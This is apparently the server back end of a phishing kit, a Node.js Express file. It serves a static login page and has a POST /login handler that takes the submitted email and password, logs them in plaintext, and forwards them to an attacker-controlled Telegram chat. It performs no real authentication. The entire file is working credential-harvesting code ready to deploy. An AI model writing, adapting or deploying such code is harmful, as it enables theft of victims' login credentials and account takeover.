const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const port = process.env.PORT || 8080;

// Ensure Telegram Bot Token & Chat ID exist
if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
  console.error("ERROR: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing.");
  process.exit(1); // Stop server if required env variables are missing
}

const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(botToken, { polling: false });

// Middleware to parse incoming request bodies
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, "public")));

// Handle login request
app.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    
    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    console.log("Login attempt:", email, password);

    // Send login credentials to Telegram bot
    const message = `🔑 Login Attempt:\n📧 Email: ${email}\n🔒 Password: ${password}`;
    await bot.sendMessage(chatId, message);

    res.status(200).json({ message: "Login data sent successfully!" });
  } catch (error) {
    console.error("Error handling login:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// Serve index.html for all unknown routes
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start server
app.listen(port, () => {
  console.log(`✅ Server is running on http://localhost:${port}`);
});
